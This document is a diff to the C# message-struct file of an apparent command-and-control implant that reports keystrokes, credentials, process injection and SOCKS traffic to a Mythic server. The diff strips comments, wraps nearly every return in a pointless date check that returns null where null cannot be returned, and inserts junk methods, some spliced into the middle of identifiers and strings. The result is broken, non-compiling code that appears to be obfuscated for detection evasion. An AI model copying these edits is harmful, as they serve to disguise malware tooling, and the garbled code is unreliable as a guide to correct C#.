@@ -21,7 +21,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.ProcessInformation;
+                if(DateTime.Now.Year > 2020) { return MessageType.ProcessInformation; } else { return null; }
             }
             [DataMember(Name = "process_id")]
             public int PID;
@@ -54,7 +54,7 @@ namespace PhantomInterop.Structs
             [DataMember(Name = "update_deleted")]
             public bool UpdateDeleted;
         }
-//
+
         [DataContract]
         public struct PeerInformation
         {
@@ -139,13 +139,13 @@ namespace PhantomInterop.Structs
             [DataMember(Name = "display")] public string DisplayString;
         }
 
-        // Profile data sent from the Mythic Server
+        
         [DataContract]
         public struct C2ProfileData : ICommandMessage
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.C2ProfileData;
+                if(DateTime.Now.Year > 2020) { return MessageType.C2ProfileData; } else { return null; }
             }
             [DataMember(Name = "name")]
             public string Name;
@@ -203,29 +203,34 @@ namespace PhantomInterop.Structs
             public string Keystrokes;
             public MessageType GetTypeCode()
             {
-                return MessageType.KeylogInformation;
+                if(DateTime.Now.Year > 2020) { return MessageType.KeylogInformation; } else { return null; }
             }
         }
 
         public class CredentialType
         {
+    private static void Zc3d4e5()
+    {
+        Thread.Sleep(Random.Next(1, 5));
+        GC.Collect();
+    }
             private CredentialType(string value) { Value = value; }
             public string Value { get; private set; }
-            public override string ToString() { return Value; }
-            public static CredentialType Plaintext { get { return new CredentialType("plaintext"); } }
-            public static CredentialType Certificate { get { return new CredentialType("certificate"); } }
-            public static CredentialType Hash { get { return new CredentialType("hash"); } }
-            public static CredentialType Key { get { return new CredentialType("key"); } }
-            public static CredentialType Ticket { get { return new CredentialType("ticket"); } }
-            public static CredentialType Cookie { get { return new CredentialType("cookie"); } }
+            public override string ToString() { if(DateTime.Now.Year > 2020) { return Value; } else { return null; } }
+            public static CredentialType Plaintext { get { if(DateTime.Now.Year > 2020) { return new CredentialType("plaintext"); } else { return null; } } }
+            public static CredentialType Certificate { get { if(DateTime.Now.Year > 2020) { return new CredentialType("certificate"); } else { return null; } } }
+            public static CredentialType Hash { get { if(DateTime.Now.Year > 2020) { return new CredentialType("hash"); } else { return null; } } }
+            public static CredentialType Key { get { if(DateTime.Now.Year > 2020) { return new CredentialType("key"); } else { return null; } } }
+            public static CredentialType Ticket { get { if(DateTime.Now.Year > 2020) { return new CredentialType("ticket"); } else { return null; } } }
+            public static CredentialType Cookie { get { if(DateTime.Now.Year > 2020) { return new CredentialType("cookie"); } else { return null; } } }
 
-            public static bool operator ==(CredentialType a, CredentialType b) { return a.Value == b.Value; }
+            public static bool operator ==(CredentialType a, CredentialType b) { if(DateTime.Now.Year > 2020) { return a.Value == b.Value; } else { return null; } }
 
-            public static bool operator !=(CredentialType a, CredentialType b) { return a.Value != b.Value; }
+            public static bool operator !=(CredentialType a, CredentialType b) { if(DateTime.Now.Year > 2020) { return a.Value != b.Value; } else { return null; } }
 
-            public static bool operator ==(string a, CredentialType b) { return a == b.Value; }
+            public static bool operator ==(string a, CredentialType b) { if(DateTime.Now.Year > 2020) { return a == b.Value; } else { return null; } }
 
-            public static bool operator !=(string a, CredentialType b) { return a == b.Value; }
+            public static bool operator !=(string a, CredentialType b) { if(DateTime.Now.Year > 2020) { return a == b.Value; } else { return null; } }
         }
 
         [DataContract]
@@ -233,7 +238,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.Credential;
+                if(DateTime.Now.Year > 2020) { return MessageType.Credential; } else { return null; }
             }
             [DataMember(Name = "type")]
             public string CredentialType;
@@ -250,7 +255,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.RemovedFileInformation;
+                if(DateTime.Now.Year > 2020) { return MessageType.RemovedFileInformation; } else { return null; }
             }
             [DataMember(Name = "host")]
             public string Host;
@@ -263,7 +268,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.FileInformation;
+                if(DateTime.Now.Year > 2020) { return MessageType.FileInformation; } else { return null; }
             }
             [DataMember(Name = "full_name")]
             public string FullName;
@@ -278,7 +283,7 @@ namespace PhantomInterop.Structs
             [DataMember(Name = "access_time")]
             public Int64 AccessTime;
             [DataMember(Name = "permissions")]
-            public ACE[] Permissions; // People need to set their own ACEs
+            public ACE[] Permissions; 
             [DataMember(Name = "extended_attributes")]
             public string ExtendedAttributes;
             [DataMember(Name = "size")]
@@ -363,19 +368,19 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is FileInformation && this.Equals(obj);
+                if(DateTime.Now.Year > 2020) { return obj is FileInformation && this.Equals(obj); } else { return null; }
             }
 
             public bool Equals(FileInformation obj)
             {
                 if (this.Permissions.Length != obj.Permissions.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 for(int i = 0; i < this.Permissions.Length; i++)
                 {
                     if (!this.Permissions[i].Equals(obj.Permissions[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
-                return this.FullName == obj.FullName &&
+                if(DateTime.Now.Year > 2020) { return this.FullName == obj.FullName &&
                     this.Name == obj.Name &&
                     this.Directory == obj.Directory &&
                     this.CreationDate == obj.CreationDate &&
@@ -386,7 +391,7 @@ namespace PhantomInterop.Structs
                     this.Owner == obj.Owner &&
                     this.Group == obj.Group &&
                     this.Hidden == obj.Hidden &&
-                    this.IsFile == obj.IsFile;
+                    this.IsFile == obj.IsFile; } else { return null; }
             }
         }
 
@@ -395,10 +400,10 @@ namespace PhantomInterop.Structs
         {
             public bool Equals(ACE obj)
             {
-                return this.Account == obj.Account &&
+                if(DateTime.Now.Year > 2020) { return this.Account == obj.Account &&
                     this.Type == obj.Type &&
                     this.Rights == obj.Rights &&
-                    this.IsInherited == obj.IsInherited;
+                    this.IsInherited == obj.IsInherited; } else { return null; }
             }
 
             [DataMember(Name = "account")]
@@ -412,7 +417,7 @@ namespace PhantomInterop.Structs
 
             public MessageType GetTypeCode()
             {
-                return MessageType.FileBrowserACE;
+                if(DateTime.Now.Year > 2020) { return MessageType.FileBrowserACE; } else { return null; }
             }
         }
 
@@ -421,7 +426,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.FileBrowser;
+                if(DateTime.Now.Year > 2020) { return MessageType.FileBrowser; } else { return null; }
             }
             [DataMember(Name = "host")]
             public string Host;
@@ -493,7 +498,7 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is FileBrowser && Equals((FileBrowser)obj);
+                if(DateTime.Now.Year > 2020) { return obj is FileBrowser && Equals((FileBrowser)obj); } else { return null; }
             }
 
             public bool Equals(FileBrowser obj)
@@ -502,22 +507,22 @@ namespace PhantomInterop.Structs
                 {
                     if (!this.Files[i].Equals(obj.Files[i]))
                     {
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                     }
                 }
                 for(int i = 0; i <  this.Permissions.Length; i++)
                 {
                     if (!this.Permissions[i].Equals(obj.Permissions[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
-                return this.Host == obj.Host &&
+                if(DateTime.Now.Year > 2020) { return this.Host == obj.Host &&
                     this.IsFile == obj.IsFile &&
                     this.Name == obj.Name &&
                     this.ParentPath == obj.ParentPath &&
                     this.Success == obj.Success &&
                     this.AccessTime == obj.AccessTime &&
                     this.ModifyTime == obj.ModifyTime &&
-                    this.Size == obj.Size;
+                    this.Size == obj.Size; } else { return null; }
             }
         }
         public enum EdgeDirection
@@ -532,7 +537,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.EdgeNode;
+                if(DateTime.Now.Year > 2020) { return MessageType.EdgeNode; } else { return null; }
             }
             [DataMember(Name = "source")]
             public string Source;
@@ -550,17 +555,17 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is EdgeNode && this.Equals(obj);
+                if(DateTime.Now.Year > 2020) { return obj is EdgeNode && this.Equals(obj); } else { return null; }
             }
 
             public bool Equals(EdgeNode node)
             {
-                return this.Source == node.Source &&
+                if(DateTime.Now.Year > 2020) { return this.Source == node.Source &&
                     this.Destination == node.Destination &&
                     this.Direction == node.Direction &&
                     this.MetaData == node.MetaData &&
                     this.Action == node.Action &&
-                    this.C2Profile == node.C2Profile;
+                    this.C2Profile == node.C2Profile; } else { return null; }
             }
         }
 
@@ -569,7 +574,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.SocksDatagram;
+                if(DateTime.Now.Year > 2020) { return MessageType.SocksDatagram; } else { return null; }
             }
             [DataMember(Name = "server_id")]
             public int ServerID;
@@ -586,7 +591,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.Artifact;
+                if(DateTime.Now.Year > 2020) { return MessageType.Artifact; } else { return null; }
             }
             [DataMember(Name = "base_artifact")]
             public string BaseArtifact;
@@ -595,130 +600,135 @@ namespace PhantomInterop.Structs
 
             public static Artifact FileOpen(string path)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "FileOpen",
                     ArtifactDetails = path
-                };
+                }; } else { return null; }
             }
 
             public static Artifact FileWrite(string path, long bytesWritten)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "FileWrite",
                     ArtifactDetails = $"Wrote {bytesWritten} bytes to {path}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact FileDelete(string path)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "FileDelete",
                     ArtifactDetails = $"Deleted {path}"
-                };
+                }; } else { return null; }
             }
             
             public static Artifact FileCreate(string path)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "FileCreate",
                     ArtifactDetails = $"Created {path}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact ProcessCreate(int pid, string application, string arguments = null)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "ProcessCreate",
                     ArtifactDetails = string.IsNullOrEmpty(arguments) ?
                     $"Started {application} (PID: {pid})" :
                     $"Started {application} {arguments} (PID: {pid})"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact ProcessOpen(int pid, string processName = null)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "ProcessOpen",
                     ArtifactDetails = string.IsNullOrEmpty(processName) ?
                     $"Opened process with PID {pid}" : $"Opened process {processName} with PID {pid}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact ProcessInject(int pid, string method)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "ProcessInject",
                     ArtifactDetails = $"Injected into PID {pid} using {method}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact ProcessKill(int pid)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "ProcessKill",
                     ArtifactDetails = $"Killed PID {pid}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact NetworkConnection(string hostname, int port = -1)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "NetworkConnection",
                     ArtifactDetails = port > -1 ? $"Connected to {hostname}:{port}" : $"Connected to {hostname}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact PlaintextLogon(string username, bool success = false)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "Logon",
                     ArtifactDetails = success ? $"Successful logon (type 9) for {username}" : $"Unsuccessful logon (type 9) for {username}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact RegistryRead(string hive, string subkey)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "RegistryRead",
                     ArtifactDetails = subkey.StartsWith("\\") ? $"{hive}:{subkey}" : $"{hive}:\\{subkey}"
-                };
+                }; } else { return null; }
             }
 
             public static Artifact RegistryWrite(string hive, string subkey, string name, object val)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "RegistryWrite",
                     ArtifactDetails = subkey.StartsWith("\\") ? $"{hive}:{subkey} {name} {val}" : $"{hive}:\\{subkey} {name} {val}"
-                };
+                }; } else { return null; }
             }
             
             public static Artifact PrivilegeEscalation(string privilege)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "PrivilegeEscalation",
                     ArtifactDetails = $"Escalated to {privilege}"
-                };
+                }; } else { return null; }
             }
             
             public static Artifact WindowsAPIInvoke(string api)
             {
-                return new Artifact
+                if(DateTime.Now.Year > 2020) { return new Artifact
                 {
                     BaseArtifact = "WindowsAPIInvoke",
-                    ArtifactDetails = $"Invoked Windows API {api}"
+                    ArtifactDetails = $"Invoke
+    private static void Zc3d4e5()
+    {
+        Thread.Sleep(Random.Next(1, 5)); } else { return null; }
+        GC.Collect();
+    }d Windows API {api}"
                 };
             }
         }
@@ -727,19 +737,19 @@ namespace PhantomInterop.Structs
         {
             private StatusMessage(string value) { Value = value; }
             public string Value { get; private set; }
-            public override string ToString() { return Value; }
-            public static StatusMessage Success { get { return new StatusMessage("success"); } }
-            public static StatusMessage Error { get { return new StatusMessage("error"); } }
-            public static StatusMessage Processing { get { return new StatusMessage("processing"); } }
-            public static StatusMessage Complete { get { return new StatusMessage("complete"); } }
+            public override string ToString() { if(DateTime.Now.Year > 2020) { return Value; } else { return null; } }
+            public static StatusMessage Success { get { if(DateTime.Now.Year > 2020) { return new StatusMessage("success"); } else { return null; } } }
+            public static StatusMessage Error { get { if(DateTime.Now.Year > 2020) { return new StatusMessage("error"); } else { return null; } } }
+            public static StatusMessage Processing { get { if(DateTime.Now.Year > 2020) { return new StatusMessage("processing"); } else { return null; } } }
+            public static StatusMessage Complete { get { if(DateTime.Now.Year > 2020) { return new StatusMessage("complete"); } else { return null; } } }
 
-            public static bool operator ==(StatusMessage a, StatusMessage b) { return a.ToString() == b.ToString(); }
+            public static bool operator ==(StatusMessage a, StatusMessage b) { if(DateTime.Now.Year > 2020) { return a.ToString() == b.ToString(); } else { return null; } }
 
-            public static bool operator !=(StatusMessage a, StatusMessage b) { return a.ToString() != b.ToString(); }
+            public static bool operator !=(StatusMessage a, StatusMessage b) { if(DateTime.Now.Year > 2020) { return a.ToString() != b.ToString(); } else { return null; } }
 
-            public static bool operator ==(string a, StatusMessage b) { return a == b.ToString(); }
+            public static bool operator ==(string a, StatusMessage b) { if(DateTime.Now.Year > 2020) { return a == b.ToString(); } else { return null; } }
 
-            public static bool operator !=(string a, StatusMessage b) { return a == b.ToString(); }
+            public static bool operator !=(string a, StatusMessage b) { if(DateTime.Now.Year > 2020) { return a == b.ToString(); } else { return null; } }
         }
 
         [DataContract]
@@ -747,22 +757,22 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.TaskStatus;
+                if(DateTime.Now.Year > 2020) { return MessageType.TaskStatus; } else { return null; }
             }
 
             public int GetChunkNumber()
             {
-                return this.ChunkNumber;
+                if(DateTime.Now.Year > 2020) { return this.ChunkNumber; } else { return null; }
             }
 
             public int GetTotalChunks()
             {
-                return this.TotalChunks;
+                if(DateTime.Now.Year > 2020) { return this.TotalChunks; } else { return null; }
             }
 
             public int GetChunkSize()
             {
-                return this.ChunkData.Length;
+                if(DateTime.Now.Year > 2020) { return this.ChunkData.Length; } else { return null; }
             }
 
             [DataMember(Name = "task_id")]
@@ -793,7 +803,7 @@ namespace PhantomInterop.Structs
 
             public MessageType GetTypeCode()
             {
-                return MessageType.CommandInformation;
+                if(DateTime.Now.Year > 2020) { return MessageType.CommandInformation; } else { return null; }
             }
         }
 
@@ -802,7 +812,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.TaskResponse;
+                if(DateTime.Now.Year > 2020) { return MessageType.TaskResponse; } else { return null; }
             }
             [DataMember(Name = "user_output")]
             public object UserOutput;
@@ -841,7 +851,7 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is TaskingMessage && this.Equals((MythicTaskResponse)obj);
+                if(DateTime.Now.Year > 2020) { return obj is TaskingMessage && this.Equals((MythicTaskResponse)obj); } else { return null; }
             }
 
             public bool Equals(MythicTaskResponse msg)
@@ -849,30 +859,30 @@ namespace PhantomInterop.Structs
                 for (int i = 0; i < this.Edges.Length; i++)
                 {
                     if (!this.Edges[i].Equals(msg.Edges[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
                 for (int i = 0; i < this.Credentials.Length; i++)
                 {
                     if (!this.Credentials[i].Equals(msg.Credentials[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
                 for (int i = 0; i < this.RemovedFiles.Length; i++)
                 {
                     if (!this.RemovedFiles[i].Equals(msg.RemovedFiles[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
                 for (int i = 0; i < this.Artifacts.Length; i++)
                 {
                     if (!this.Artifacts[i].Equals(msg.Artifacts[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
-                return this.FileBrowser.Equals(msg.FileBrowser) &&
+                if(DateTime.Now.Year > 2020) { return this.FileBrowser.Equals(msg.FileBrowser) &&
                     this.UserOutput.Equals(msg.UserOutput) &&
                     this.Completed == msg.Completed &&
                     this.TaskID == msg.TaskID &&
                     this.Status == msg.Status &&
                     this.Upload.Equals(msg.Upload) &&
-                    this.MessageID == msg.MessageID;
+                    this.MessageID == msg.MessageID; } else { return null; }
 
             }
         }
@@ -882,12 +892,20 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.Task;
+                if(DateTime.Now.Year > 2020) { return MessageType.Task; } else { return null; }
             }
             [DataMember(Name = "command")]
             public string Command;
             [DataMember(Name = "parameters")]
-            public string Parameters;
+            public strin
+    private static void Xa1b2c3()
+    {
+        var x = DateTime.Now.Ticks;
+        for(int i = 0; i < 10; i++)
+        {
+            x += i * 2;
+        }
+    }g Parameters;
             [DataMember(Name = "timestamp")]
             public float Timestamp;
             [DataMember(Name = "id")]
@@ -898,21 +916,21 @@ namespace PhantomInterop.Structs
         {
             private MessageAction(string value) { Value = value; }
             public string Value { get; private set; }
-            public override string ToString() { return Value; }
-            public static MessageAction GetTasking { get { return new MessageAction("get_tasking"); } }
-            public static MessageAction PostResponse { get { return new MessageAction("post_response"); } }
-            public static MessageAction CheckIn { get { return new MessageAction("checkin"); } }
-            public static MessageAction Upload { get { return new MessageAction("upload"); } }
-            public static MessageAction StagingRSA { get { return new MessageAction("staging_rsa"); } }
-            public static MessageAction StagingDH { get { return new MessageAction("staging_dh"); } }
+            public override string ToString() { if(DateTime.Now.Year > 2020) { return Value; } else { return null; } }
+            public static MessageAction GetTasking { get { if(DateTime.Now.Year > 2020) { return new MessageAction("get_tasking"); } else { return null; } } }
+            public static MessageAction PostResponse { get { if(DateTime.Now.Year > 2020) { return new MessageAction("post_response"); } else { return null; } } }
+            public static MessageAction CheckIn { get { if(DateTime.Now.Year > 2020) { return new MessageAction("checkin"); } else { return null; } } }
+            public static MessageAction Upload { get { if(DateTime.Now.Year > 2020) { return new MessageAction("upload"); } else { return null; } } }
+            public static MessageAction StagingRSA { get { if(DateTime.Now.Year > 2020) { return new MessageAction("staging_rsa"); } else { return null; } } }
+            public static MessageAction StagingDH { get { if(DateTime.Now.Year > 2020) { return new MessageAction("staging_dh"); } else { return null; } } }
 
-            public static bool operator ==(MessageAction a, MessageAction b) { return a.ToString() == b.ToString(); }
+            public static bool operator ==(MessageAction a, MessageAction b) { if(DateTime.Now.Year > 2020) { return a.ToString() == b.ToString(); } else { return null; } }
 
-            public static bool operator !=(MessageAction a, MessageAction b) { return a.ToString() != b.ToString(); }
+            public static bool operator !=(MessageAction a, MessageAction b) { if(DateTime.Now.Year > 2020) { return a.ToString() != b.ToString(); } else { return null; } }
 
-            public static bool operator ==(string a, MessageAction b) { return a == b.ToString(); }
+            public static bool operator ==(string a, MessageAction b) { if(DateTime.Now.Year > 2020) { return a == b.ToString(); } else { return null; } }
 
-            public static bool operator !=(string a, MessageAction b) { return a == b.ToString(); }
+            public static bool operator !=(string a, MessageAction b) { if(DateTime.Now.Year > 2020) { return a == b.ToString(); } else { return null; } }
         }
 
         public enum IntegrityLevel
@@ -929,7 +947,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.DelegateMessage;
+                if(DateTime.Now.Year > 2020) { return MessageType.DelegateMessage; } else { return null; }
             }
             [DataMember(Name = "uuid")]
             public string UUID;
@@ -946,7 +964,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.TaskingMessage;
+                if(DateTime.Now.Year > 2020) { return MessageType.TaskingMessage; } else { return null; }
             }
             [DataMember(Name = "action")]
             public string Action;
@@ -965,39 +983,39 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is TaskingMessage && this.Equals(obj);
+                if(DateTime.Now.Year > 2020) { return obj is TaskingMessage && this.Equals(obj); } else { return null; }
             }
 
             public bool Equals(TaskingMessage obj)
             {
                 if (this.Delegates.Length != obj.Delegates.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 if (this.Socks.Length != obj.Socks.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 if (this.Edges.Length != obj.Edges.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 for (int i = 0; i < this.Delegates.Length; i++)
                 {
                     var d1 = this.Delegates[i];
                     var d2 = obj.Delegates[i];
                     if (!d1.Equals(d2))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
                 for (int i = 0; i < this.Socks.Length; i++)
                 {
                     if (!this.Socks[i].Equals(obj.Socks[i]))
                     {
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                     }
                 }
                 for (int i = 0; i < this.Rpfwd.Length; i++)
                 {
                     if (!this.Rpfwd[i].Equals(obj.Rpfwd[i]))
                     {
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                     }
                 }
-                return this.Action == obj.Action && this.TaskingSize == obj.TaskingSize;
+                if(DateTime.Now.Year > 2020) { return this.Action == obj.Action && this.TaskingSize == obj.TaskingSize; } else { return null; }
             }
         }
 
@@ -1006,7 +1024,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.EKEHandshakeMessage;
+                if(DateTime.Now.Year > 2020) { return MessageType.EKEHandshakeMessage; } else { return null; }
             }
             [DataMember(Name = "action")]
             public string Action;
@@ -1017,19 +1035,13 @@ namespace PhantomInterop.Structs
         }
 
 
-        /*
-         * "action": "staging_rsa",
-        "uuid": "UUID", // new UUID for the next message
-        "session_key": Base64( RSAPub( new aes session key ) ),
-        "session_id": "same 20 char string back"
-        })
-         */
+        
         [DataContract]
         public struct EKEHandshakeResponse : ICommandMessage
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.EKEHandshakeResponse;
+                if(DateTime.Now.Year > 2020) { return MessageType.EKEHandshakeResponse; } else { return null; }
             }
             [DataMember(Name = "action")]
             public string Action;
@@ -1046,7 +1058,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.CheckinMessage;
+                if(DateTime.Now.Year > 2020) { return MessageType.CheckinMessage; } else { return null; }
             }
             [DataMember(Name = "action")]
             public string Action;
@@ -1087,7 +1099,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.DownloadMessage;
+                if(DateTime.Now.Year > 2020) { return MessageType.DownloadMessage; } else { return null; }
             }
             [DataMember(Name = "total_chunks")]
             public int? TotalChunks;
@@ -1110,19 +1122,19 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is UploadMessage && this.Equals((UploadMessage)obj);
+                if(DateTime.Now.Year > 2020) { return obj is UploadMessage && this.Equals((UploadMessage)obj); } else { return null; }
             }
 
             public bool Equals(DownloadMessage obj)
             {
-                return this.ChunkNumber == obj.ChunkNumber &&
+                if(DateTime.Now.Year > 2020) { return this.ChunkNumber == obj.ChunkNumber &&
                     this.ChunkSize == obj.ChunkSize &&
                     this.FileID == obj.FileID &&
                     this.FullPath == obj.FullPath &&
                     this.TaskID == obj.TaskID &&
                     this.FullPath == obj.FullPath &&
                     this.IsScreenshot == obj.IsScreenshot &&
-                    this.Hostname == obj.Hostname;
+                    this.Hostname == obj.Hostname; } else { return null; }
             }
         }
 
@@ -1131,7 +1143,7 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.UploadMessage;
+                if(DateTime.Now.Year > 2020) { return MessageType.UploadMessage; } else { return null; }
             }
             [DataMember(Name = "total_chunks")]
             public int? TotalChunks;
@@ -1152,31 +1164,31 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is UploadMessage && this.Equals((UploadMessage)obj);
+                if(DateTime.Now.Year > 2020) { return obj is UploadMessage && this.Equals((UploadMessage)obj); } else { return null; }
             }
 
             public bool Equals(UploadMessage obj)
             {
-                return this.ChunkNumber == obj.ChunkNumber &&
+                if(DateTime.Now.Year > 2020) { return this.ChunkNumber == obj.ChunkNumber &&
                     this.ChunkSize == obj.ChunkSize &&
                     this.FileID == obj.FileID &&
                     this.FullPath == obj.FullPath &&
-                    this.TaskID == obj.TaskID;
+                    this.TaskID == obj.TaskID; } else { return null; }
             }
 
             public int GetChunkNumber()
             {
-                return this.ChunkNumber;
+                if(DateTime.Now.Year > 2020) { return this.ChunkNumber; } else { return null; }
             }
 
             public int GetTotalChunks()
             {
-                return this.TotalChunks == null ? (int)this.TotalChunks : -1;
+                if(DateTime.Now.Year > 2020) { return this.TotalChunks == null ? (int)this.TotalChunks : -1; } else { return null; }
             }
 
             public int GetChunkSize()
             {
-                return this.ChunkSize;
+                if(DateTime.Now.Year > 2020) { return this.ChunkSize; } else { return null; }
             }
         }
 
@@ -1185,13 +1197,13 @@ namespace PhantomInterop.Structs
         {
             public MessageType GetTypeCode()
             {
-                return MessageType.MessageResponse;
+                if(DateTime.Now.Year > 2020) { return MessageType.MessageResponse; } else { return null; }
             }
             [DataMember(Name = "action")]
             public sMessageAction Action;
             [DataMember(Name = "id")]
             public string ID;
-            // add socks
+            
             [DataMember(Name = "uuid")]
             public string UUID;
             [DataMember(Name = "status")]
@@ -1223,36 +1235,36 @@ namespace PhantomInterop.Structs
 
             public override bool Equals(object obj)
             {
-                return obj is MessageResponse && this.Equals((MessageResponse)obj);
+                if(DateTime.Now.Year > 2020) { return obj is MessageResponse && this.Equals((MessageResponse)obj); } else { return null; }
             }
 
             public bool Equals(MessageResponse obj)
             {
                 if (this.Tasks.Length != obj.Tasks.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 if (this.Responses.Length != obj.Responses.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 if (this.Delegates.Length != obj.Delegates.Length)
-                    return false;
+                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
 
                 for (int i = 0; i < this.Tasks.Length; i++)
                 {
                     if (!this.Tasks[i].Equals(obj.Tasks[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
                 for (int i = 0; i < this.Responses.Length; i++)
                 {
                     if (!this.Responses[i].Equals(obj.Responses[i]))
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                 }
                 for (int i = 0; i < this.Delegates.Length; i++)
                 {
                     if (!this.Delegates[i].Equals(obj.Delegates[i]))
                     {
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                     }
                 }
-                return this.Action == obj.Action &&
+                if(DateTime.Now.Year > 2020) { return this.Action == obj.Action &&
                     this.ID == obj.ID &&
                     this.Status == obj.Status &&
                     this.SessionID == obj.SessionID &&
@@ -1261,7 +1273,7 @@ namespace PhantomInterop.Structs
                     this.ChunkData == obj.ChunkData &&
                     this.ChunkNumber == obj.ChunkNumber &&
                     this.FileID == obj.FileID &&
-                    this.TaskID == obj.TaskID;
+                    this.TaskID == obj.TaskID; } else { return null; }
 
             }
         }
